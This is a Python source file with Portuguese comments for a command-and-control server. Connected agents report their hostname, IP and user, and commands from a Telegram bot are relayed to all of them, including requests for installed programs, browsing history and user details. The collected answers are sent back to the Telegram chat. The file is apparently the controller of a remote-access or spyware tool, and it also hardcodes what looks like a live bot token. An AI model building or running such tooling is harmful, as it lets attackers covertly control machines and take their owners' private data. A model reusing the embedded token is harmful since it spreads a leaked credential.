import requests
import socket
import time
import threading

# Configurações do Bot
TOKEN = '8104816754:AAG8nn_4pPIH1PVO93ygkeSBbUhtsqxWvtM'
URL = f'https://api.telegram.org/bot{TOKEN}'

# Configurações do Servidor
conexoes_do_servidor = {}


def lidar_com_cliente(cliente, endereco):
    thread_name = threading.current_thread().name

    try:
        while True:
            try:
                conexao_da_thread = conexoes_do_servidor[thread_name]
                comando_da_vez = conexao_da_thread["commands"].pop(0)
            except (KeyError, IndexError):
                time.sleep(2)
                continue
            print(f"Enviando {comando_da_vez} para {endereco}...")
            cliente.sendall(comando_da_vez.encode())
            conexao_da_thread["respostas"].append(cliente.recv(1024).decode())
            time.sleep(2)
    except Exception:
        print(f"Cliente ficou offline. Encerrando a thread {thread_name}!")
        del conexoes_do_servidor[thread_name]



def servidor_main():
    # Configurações do Servidor
    HOST, PORT = '0.0.0.0', 5000

    # Configuração do servidor
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.bind((HOST, PORT))
    servidor.listen(1)
    print(f"Servidor rodando na porta {PORT}...")
    while True:
        print(conexoes_do_servidor)
        # Aceita conexões de clientes
        cliente, endereco = servidor.accept()
        print(f"Cliente conectado: {endereco}")
        infos = cliente.recv(1024).decode()
        hostname, ip_agente, usuario = infos.split("|")
        thread_para_o_cliente = threading.Thread(target=lidar_com_cliente, args=(cliente, endereco))
        thread_para_o_cliente.start()
        conexoes_do_servidor[thread_para_o_cliente.name] = {
            "thread": thread_para_o_cliente,
            "host_name": hostname,
            "ip_agente": ip_agente,
            "usuario": usuario,
            "id_agente": f"{endereco[1]} - {hostname} - {ip_agente} - {usuario}",
            "endereço": endereco,
            "commands": [],
            "respostas": [],
        }
        print(f"Criei a conexão {thread_para_o_cliente} para o cliente!")





def listar_clientes_conectados():
    """Retorna uma string formatada com a lista de clientes conectados."""
    clientes = []
    for thread_name, dados_conexao in conexoes_do_servidor.items():
        id_agente = dados_conexao['id_agente']
        clientes.append(f"Agente {id_agente}")
    return "\n\n".join(clientes)


def inserir_comando_nas_conexoes(comando):
    for thread_name, dados_conexao in conexoes_do_servidor.items():
        dados_conexao["commands"].append(comando)
        print(f"Adicionei o comando {comando} para a thread {thread_name}!")


def receber_respostas_das_conexoes():
    respostas = []
    print("recebendo recebendo respostas...")
    for thread_name, dados_conexao in conexoes_do_servidor.items():
        id_agente = dados_conexao['id_agente']
        resposta = None
        while resposta is None:
            try:
                resposta = dados_conexao['respostas'].pop(0)
            except IndexError:
                pass
        respostas.append(
            f"Agente {id_agente} retornou {resposta}"
        )
    return "\n\n".join(respostas)



# Configurações do Bot
def bot_main():
    def enviar_mensagem(chat_id, texto):
        """Envia uma mensagem para o chat especificado."""
        try:
            resposta = requests.post(URL + '/sendMessage', data={'chat_id': chat_id, 'text': texto})
            # print(f"Mensagem enviada para {chat_id}: {texto}")
            return resposta
        except Exception as e:
            print(f"Erro ao enviar mensagem: {e}")
            return None

    def processar_mensagens():
        """Processa as mensagens recebidas do Telegram."""
        ultimo_update_id = None
        while True:
            try:
                # Busca atualizações do Telegram
                params = {"timeout": 10}
                if ultimo_update_id:
                    params["offset"] = ultimo_update_id + 1
                resposta = requests.get(URL + '/getUpdates', params=params)

                # Verifica se a requisição foi bem-sucedida
                if resposta.status_code != 200:
                    print(f"Erro na requisição: {resposta.status_code}")
                    time.sleep(5)
                    continue

                # Processa as mensagens recebidas
                mensagens = resposta.json().get('result', [])
                for mensagem_obj in mensagens:
                    update_id = mensagem_obj['update_id']
                    if ultimo_update_id and update_id <= ultimo_update_id:
                        continue  # Ignora mensagens já processadas

                    ultimo_update_id = update_id  # Atualiza o último ID processado
                    ultima_msg = mensagem_obj.get('message', {})
                    chat_id = ultima_msg.get('chat', {}).get('id')
                    texto = ultima_msg.get('text', '').strip().lower()
                    nome_usuario = ultima_msg.get('from', {}).get('first_name', 'Usuário')

                    if not chat_id or not texto:
                        continue  # Ignora mensagens sem conteúdo válido

                    if texto.startswith("/"):
                        print(f"Comando recebido: {texto}")
                        if texto == '/start':
                            mensagem = f"Bem-vindo {nome_usuario} ao bot! Para saber mais comandos, aperte /?"
                            enviar_mensagem(chat_id, mensagem)
                        elif texto == '/?':
                            mensagem = (
                                "Comandos disponíveis:\n"
                                "/start - Iniciar o bot\n"
                                "/info - Informações do sistema\n"
                                "/ping - Pingar os clientes\n"
                                "/status - Status do cliente\n"
                                "/clientes - Lista de clientes conectados\n"
                                "/programas - Lista de programas instalados\n"
                                "/historico - Histórico de navegação\n"
                                "/usuario - Informações do usuário"
                            )
                            enviar_mensagem(chat_id, mensagem)
                        elif texto == '/clientes':
                            resposta = listar_clientes_conectados()
                            enviar_mensagem(chat_id, resposta)
                        elif texto in ['/info', "/ping", '/status', '/programas', '/historico', '/usuario']:
                            # Encaminha o comando para o cliente e obtém a resposta
                            inserir_comando_nas_conexoes(texto)
                            respostas = receber_respostas_das_conexoes()
                            enviar_mensagem(chat_id, str(respostas))
                        else:
                            # Responde para comandos não reconhecidos
                            enviar_mensagem(chat_id, "Comando não reconhecido.")
                    else:
                        # Ignora mensagens que não são comandos
                        print(f"Mensagem ignorada (não é um comando): {texto}")

            except Exception as e:
                print(f"Erro no processamento de mensagens: {e}")

            time.sleep(1)

    processar_mensagens()



thread_servidor = threading.Thread(target=servidor_main, daemon=True)
thread_servidor.start()

thread_bot = threading.Thread(target=bot_main, daemon=True)
thread_bot.start()


while True:
    print(f"\nTemos {len(conexoes_do_servidor)} conexões ativas!")
    print(conexoes_do_servidor)
    time.sleep(5)